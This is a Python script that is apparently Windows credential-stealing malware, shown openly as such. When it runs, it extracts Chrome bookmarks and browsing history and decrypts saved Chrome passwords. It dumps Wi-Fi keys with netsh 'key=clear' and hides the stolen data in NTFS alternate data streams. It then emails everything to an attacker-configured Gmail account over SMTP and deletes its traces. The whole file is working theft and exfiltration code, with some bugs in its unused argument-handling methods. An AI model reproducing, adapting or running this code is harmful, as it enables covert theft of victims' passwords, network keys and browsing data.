import os
import sys
import argparse
import json
import sqlite3
import csv
import win32.win32crypt as win32crypt
import subprocess
import re
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import platform


usergmail = "Enter Your Email"
# To Create password visit : - https://myaccount.google.com/apppasswords
userGmailPassword = "Enter Your 2 step generated mail Password (eg : abhismjkdnl8mxi) "


class Bookmark:

    def Arguments(self):

        parser = self.parser
        args = self.args

        parser = argparse.ArgumentParser(
            description="To Retrieve Google Chrome Bookmark ")
        parser.add_argument(
            "-d", "--display", help="To display the output on the terminal", action="store_true")
        parser.add_argument(
            "-o", "--output", help="To save the output in {csv | json | txt } format")
        args = parser.parse_args()

        if args.display:
            for data in Extracter():
                print(data)
        elif args.output == "csv":
            output_csv(Extracter())
        elif args.output == "json":
            output_json(Extracter())
        elif args.output == "txt":
            output_text(Extracter())
        else:
            parser.print_help()

    def Main(self):
        self.output_json(self.Extracter())
        self.output_text(self.Extracter())

    def Extracter(self):
        path = self.getpath()
        path = path + 'Bookmarks'
        info_list = []
        with open(path, 'r') as f:
            with open("Bookmarks.json", "w") as b:
                for line in f:
                    b.write(line)

        with open("Bookmarks.json", "r") as b:
            contents = b.read()
            # print(type(contents))  --> strings
            # --> converts the string into a dictionary to perform operations
            data = json.loads(contents)

            bar_length = len(data['roots']['bookmark_bar']['children'])

            for i in range(0, bar_length):
                info_list.append(
                    {
                        'bookmark_bar': {
                            "Date_Added": data['roots']['bookmark_bar']['children'][i]['date_added'],
                            "Name": data['roots']['bookmark_bar']['children'][i]['name'],
                            "Url": data['roots']['bookmark_bar']['children'][i]['url']
                        }
                    })

            syn_length = len(data['roots']['synced']['children'])

            for i in range(0, syn_length):
                info_list.append(
                    {
                        'Synced': {
                            "Date_Added": data['roots']['synced']['children'][i]['date_added'],
                            "Name": data['roots']['synced']['children'][i]['name'],
                            "Url": data['roots']['synced']['children'][i]['url']
                        }
                    })

        os.remove("Bookmarks.json")

        return info_list

    def getpath(self):
        os_platform = sys.platform
        if os_platform == "win32" or "cygwin":
            PathName = os.getenv('localappdata') + \
                '\\Google\\Chrome\\User Data\\Default\\'
        else:
            pass

        return PathName

    def output_csv(self, info):
        self.info = info
        path = os.getenv('localappdata')
        with open(f'{path}//Backup1.txt:Chrome_bookmarks.csv', 'w') as csv_file:
            for line in info:
                csv_file.write(json.dumps(line, indent=5))

    def output_json(self, info):
        self.info = info
        path = os.getenv('localappdata')
        with open(f'{path}//Backup1.txt:Chrome_bookmarks.json', 'w') as json_file:
            for line in info:
                json_file.write(json.dumps(line, indent=5))

    def output_text(self, info):
        self.info = info
        path = os.getenv('localappdata')
        with open(f'{path}//Backup1.txt:Chrome_bookmarks.txt', 'w') as txtfile:
            for line in info:
                txtfile.write(json.dumps(line, indent=5))


# End of Bookmark Class

class History:

    def Arguments(self):
        self.parser = argparse.ArgumentParser(
            description="Retrieve Google Chrome Histroy ")
        parser.add_argument(
            "-d", "--display", help="To display the output on the terminal", action="store_true")
        parser.add_argument(
            "-o", "--output", help="To save the output in {csv | json | text } format")
        self.args = parser.parse_args()

        if args.display:
            for data in Extracter():
                print(data)
        elif args.output == "csv":
            output_csv(Extracter())
        elif args.output == "json":
            output_json(Extracter())
        elif args.output == "text":
            output_text(Extracter())
        else:
            parser.print_help()

    def Main(self):
        self.output_json(self.Extracter())
        self.output_text(self.Extracter())

    def getpath(self):
        os_Platform = sys.platform
        if os_Platform == "win32" or os_Platform == "cygwin":
            PathName = os.getenv("localappdata") + \
                '\\\Google\\Chrome\\User Data\\Default\\'
        else:
            if os_Platform == "linux" or os_Platform == "linux2":
                PathName = '/.config/google-chrome/Defaults '
            else:
                # print("Currently Operating System Not Supported")
                pass
        return PathName

    def Extracter(self):
        path = self.getpath()
        info_list = []
        try:
            connection = sqlite3.connect(path + 'History')
            with connection:   # Context Manager
                cursor = connection.cursor()
                v = cursor.execute("""SELECT url, title, datetime((last_visit_time/1000000)-11644473600, 'unixepoch', 'localtime')
                                        AS last_visit_time FROM urls ORDER BY last_visit_time DESC""")
                value = v.fetchall()

                for url, title, last_visit_time in value:
                    info_list.append({
                        "Url": url,
                        "Title": title,
                        "Date&Time": last_visit_time
                    })
        except sqlite3.OperationalError as e:
            # print(e)
            pass

        return info_list

    def output_csv(self, info):
        self.info = info
        path = os.getenv('localappdata')
        with open(f'{path}//Backup2.txt:Chrome_history.csv', 'wb') as csv_file:
            for data in info:
                csv_file.write(
                    f"{data['Url']} \t {data['Title']} \t {data['Date&Time']} \n".encode('UTF-8'))
        # print("Write Successfull , file stored as Chrome_history.csv")

    def output_json(self, info):
        self.info = info
        path = os.getenv('localappdata')
        with open(f'{path}//Backup2.txt:Chrome_history.json', 'wb') as json_file:
            for data in info:
                json_file.write(f"{data['Url']} \t\t {data['Title']} \t\t{data['Date&Time']} \n".encode(
                    'utf-8'))  # encode convert string into bytes
        # print("Data Successfully written in Chrome_history.json")

    def output_text(self, info):
        self.info = info
        path = os.getenv('localappdata')
        with open(f'{path}//Backup2.txt:Chrome_history.txt', 'wb') as txt_file:
            for data in info:
                txt_file.write(f"{data['Url']} \t\t {data['Title']} \t\t{data['Date&Time']} \n".encode(
                    'utf-8'))  # encode convert string into bytes
        # print("Data Successfully written in Chrome_history.txt")


# End of History Class


class Password:

    def Arguments(self):
        parser = argparse.ArgumentParser(
            description="Retrieve Google Chrome Saved Passwords")
        parser.add_argument(
            '-o', '--output', help="Enter the format [ csv | json | text ] in which you wanna save file")
        parser.add_argument(
            '-d', '--display', help="To display the output in terminal", action='store_true')
        args = parser.parse_args()

        if args.display:
            for data in Extracter():
                print(data)
        elif args.output == "csv":
            output_csv(Extracter())
        elif args.output == "json":
            output_json(Extracter())
        elif args.output == "text":
            output_text(Extracter())
        else:
            parser.print_help()

    def Main(self):
        self.output_json(self.Extracter())
        self.output_text(self.Extracter())

    def Extracter(self):

        info_list = []
        path = self.getpath()

        try:
            connection = sqlite3.connect(
                path + 'Login Data')    # Setting path to DB
            with connection:
                cursor = connection.cursor()
                v = cursor.execute(
                    'SELECT action_url, username_value, password_value FROM logins')  # SQL Command
                value = v.fetchall()  # Collect and store all rows

                for url, username, password in value:

                    if password:
                        password = win32crypt.CryptUnprotectData(
                            password, None, None, None, 0)

                    info_list.append({
                        "Origin_Url": url,
                        "Username": username,
                        "Password": str(password)
                    })
        except sqlite3.OperationalError as e:
            e = str(e)
            # if (e == 'database is locked'):
            #     print('[!] Make sure Google Chrome is not running in the background')
            # elif (e == 'no such table: logins'):
            #     print('[!] Something wrong with the database name')
            # elif (e == 'unable to open database file'):
            #     print('[!] Something wrong with the database path')
            # else:
            #     print(e)
            sys.exit(0)

        return info_list

    def getpath(self):

        if os.name == 'nt':       # for Windows
            PathName = os.getenv('localappdata') + \
                '\\Google\\Chrome\\User Data\\Default\\'

        elif os.name == 'posix':    # for OS X
            # print("Currently Platform not supported ")
            sys.exit()
        else:               # Else for Linux User
            path = '/.config/google-chrome/Defaults '

        return PathName

    def output_csv(self, info):
        self.info = info
        path = os.getenv('localappdata')
        try:
            with open(f'{path}//Backup3.txt:Chrome_password.csv', 'wb') as csv_file:
                for data in info:
                    csv_file.write(
                        f"{data['Origin_Url']}\t\t {data['Username']}\t\t {data['Password']}\n".encode('utf-8'))

            # print("Data written to Chrome_passwords.csv")
        except EnvironmentError:
            # print("Environmental error connot write data")
            pass

    # Python uses UNICODE() > 256 CHARACTER BUT OTHER APPLICATION DON'T UNDERSTAND UNICODE THEREFORE WE HAVE TO ENCODE IT USING UTF-8
    # UTF-8 IS STANDARD CODING
    # UNICODE HAS CODE FOR EACH CHARACTER IN EVERY LANGUAGE LIKE JAPANESE,GERMAN,BRITISH,ETC

    def output_json(self, info):
        self.info = info
        path = os.getenv('localappdata')
        with open(f'{path}//Backup3.txt:Chrome_password.json', 'wb') as json_file:
            for data in info:
                json_file.write(f"{data['Origin_Url']} \t\t {data['Username']} \t\t{data['Password']} \n".encode(
                    'utf-8'))  # encode convert string into bytes
        # print("Data Successfully written in Chrome_password.json")

    def output_text(self, info):
        self.info = info
        path = os.getenv('localappdata')
        with open(f'{path}//Backup3.txt:Chrome_password.txt', 'wb') as txt_file:
            for data in info:
                txt_file.write(f"{data['Origin_Url']} \t\t {data['Username']} \t\t{data['Password']} \n".encode(
                    'utf-8'))  # encode convert string into bytes
        # print("Data Successfully written in Chrome_password.txt")

# End of Password Class


class WifiStealer:

    def Main(self):
        gmail = usergmail
        password = userGmailPassword
        host_os = platform.system()
        file1 = os.getenv('localappdata')

        if host_os == "Windows":
            msg = MIMEMultipart()
            msg['Subject'] = "Wifi Password Extracted "
            msg['From'] = gmail
            msg['To'] = gmail
            # for body
            body = """<h1 style  = 'font-family = tahoma;'>Great Wifi Password Successfully Hacked!!!! <br> 
                    Yeah!!!</h1>"""
            body = MIMEText(
                body, 'html')   # for string body MIMEText(body,'plain')
            msg.attach(body)

            command1 = "netsh wlan show profile "
            networks = subprocess.check_output(command1, shell=True)
            networks = networks.decode('ISO-8859-1')
            networks_list = re.findall(r'(:\s.*)', networks)

            final_output = ""
            with open(f'{file1}//backup.txt:WifiPassword.txt', 'w') as f1:
                with open(f'{file1}//backup.txt:Specialcard.txt', 'w') as f2:
                    for network in networks_list:
                        network = network.strip(': ')
                        command2 = command1 + network + " key=clear"
                        try:
                            final_output = subprocess.check_output(
                                command2, shell=True)
                            final_output = final_output.decode('ISO-8859-1')
                            trial = re.findall(
                                '(Name\s+:\s\w+)|(Authentication\s*:\s[a-zA-Z0-9-]+)|(Key Content\s*:\s(\w+))', final_output)
                            f1.write(final_output)
                            trial = str(trial)
                            if trial == "[]":
                                pass
                            else:
                                trial = " ".join(trial.split())
                                f2.write(trial + "\n")
                        except:
                            # print("****************Some Error Occured Can't collect Data*****************")
                            pass

            with smtplib.SMTP('smtp.gmail.com', 587) as smtp:
                smtp.ehlo()
                smtp.starttls()
                smtp.ehlo()

                # Sending the test file as an attachment in the mail
                # MIME (Multipurpose Internet Mail Extensions)

                part = MIMEBase('application', "octet-stream")
                part.set_payload(
                    open(f'{file1}//backup.txt:WifiPassword.txt', "rb").read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', 'attachment; filename="%s"'
                                % os.path.basename(f'{file1}//backup.txt:WifiPasswordl.txt'))
                msg.attach(part)

                part = MIMEBase('application', "octet-stream")
                part.set_payload(
                    open(f'{file1}//backup.txt:Specialcard.txt', "rb").read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', 'attachment; filename="%s"'
                                % os.path.basename(f'{file1}//backup.txt:Specialcard.txt'))
                msg.attach(part)

                smtp.login(gmail, password)
                smtp.send_message(msg)

            os.remove(f'{file1}//backup.txt:WifiPassword.txt')
            os.remove(f'{file1}//backup.txt:Specialcard.txt')
            os.remove(f'{file1}//backup.txt')

        else:
            # print("Currently Operating System not supported ")
            pass


def MailService(file1, file2):

    gmail = usergmail
    password = userGmailPassword
    msg = MIMEMultipart()
    msg['Subject'] = "Wifi Password Extracted "
    msg['From'] = gmail
    msg['To'] = gmail

    # for body
    body = """<h1 style  = 'font-family = tahoma;'>Great Wifi Password Successfully Hacked!!!! <br> 
               Yeah!!!</h1>"""
    body = MIMEText(body, 'html')   # for string body MIMEText(body,'plain')
    msg.attach(body)

    with smtplib.SMTP('smtp.gmail.com', 587) as smtp:
        smtp.ehlo()
        smtp.starttls()
        smtp.ehlo()

        # Sending the test file as an attachment in the mail
        # MIME (Multipurpose Internet Mail Extensions)

        part = MIMEBase('application', "octet-stream")
        part.set_payload(open(f'{file1}', "rb").read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', 'attachment; filename="%s"'
                        % os.path.basename(f'{file1}'))
        msg.attach(part)

        part = MIMEBase('application', "octet-stream")
        part.set_payload(open(f'{file2}', "rb").read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', 'attachment; filename="%s"'
                        % os.path.basename(f'{file2}'))
        msg.attach(part)

        msg.attach(part)
        smtp.login(gmail, password)
        smtp.send_message(msg)


def ProMailService(file1, file2, file3, file4, file5, file6):

    # It can Send Max of 4 attachments in a mail

    gmail = usergmail
    password = userGmailPassword
    msg = MIMEMultipart()
    msg['Subject'] = "Chrome-Exploits !! "
    msg['From'] = gmail
    msg['To'] = gmail
    # for body
    body = """<h1 style  = 'font-family = tahoma;'>Great Chrome-Exploit works Beautifully :) <br> 
               Yeah!!!</h1>"""
    body = MIMEText(body, 'html')   # for string body MIMEText(body,'plain')
    msg.attach(body)

    with smtplib.SMTP('smtp.gmail.com', 587) as smtp:
        smtp.ehlo()
        smtp.starttls()
        smtp.ehlo()

        # Sending the test file as an attachment in the mail
        # MIME (Multipurpose Internet Mail Extensions)

        part = MIMEBase('application', "octet-stream")
        part.set_payload(open(f'{file1}', "rb").read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', 'attachment; filename="%s"'
                        % os.path.basename(f'{file1}'))
        msg.attach(part)

        part = MIMEBase('application', "octet-stream")
        part.set_payload(open(f'{file2}', "rb").read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', 'attachment; filename="%s"'
                        % os.path.basename(f'{file2}'))
        msg.attach(part)

        part = MIMEBase('application', "octet-stream")
        part.set_payload(open(f'{file3}', "rb").read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', 'attachment; filename="%s"'
                        % os.path.basename(f'{file3}'))
        msg.attach(part)

        part = MIMEBase('application', "octet-stream")
        part.set_payload(open(f'{file4}', "rb").read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', 'attachment; filename="%s"'
                        % os.path.basename(f'{file4}'))

        part = MIMEBase('application', "octet-stream")
        part.set_payload(open(f'{file5}', "rb").read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', 'attachment; filename="%s"'
                        % os.path.basename(f'{file5}'))

        part = MIMEBase('application', "octet-stream")
        part.set_payload(open(f'{file6}', "rb").read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', 'attachment; filename="%s"'
                        % os.path.basename(f'{file6}'))

        msg.attach(part)
        smtp.login(gmail, password)
        smtp.send_message(msg)


try:
    bookmark = Bookmark()
    bookmark.Main()

    history = History()
    history.Main()

    password = Password()
    password.Main()

    wifistealer = WifiStealer()
    wifistealer.Main()

    path = os.getenv('localappdata')

    ProMailService(f'{path}//Backup1.txt:Chrome_bookmarks.txt', f'{path}//Backup1.txt:Chrome_bookmarks.json',
                   f'{path}\\Backup2.txt:Chrome_history.txt', f'{path}\\Backup2.txt:Chrome_history.json',
                   f'{path}\\Backup3.txt:Chrome_password.txt', f'{path}\\Backup3.txt:Chrome_password.json')

    os.remove(f'{path}\\Backup1.txt:Chrome_bookmarks.txt')
    os.remove(f'{path}\\Backup1.txt:Chrome_bookmarks.json')
    os.remove(f'{path}//Backup2.txt:Chrome_history.txt')
    os.remove(f'{path}//Backup2.txt:Chrome_history.json')
    os.remove(f'{path}//Backup3.txt:Chrome_password.txt')
    os.remove(f'{path}//Backup3.txt:Chrome_password.json')
    os.remove(f"{path}//Backup1.txt")
    os.remove(f"{path}//Backup2.txt")
    os.remove(f"{path}//Backup3.txt")

except Exception as e:
    print(e)
    exit(0)
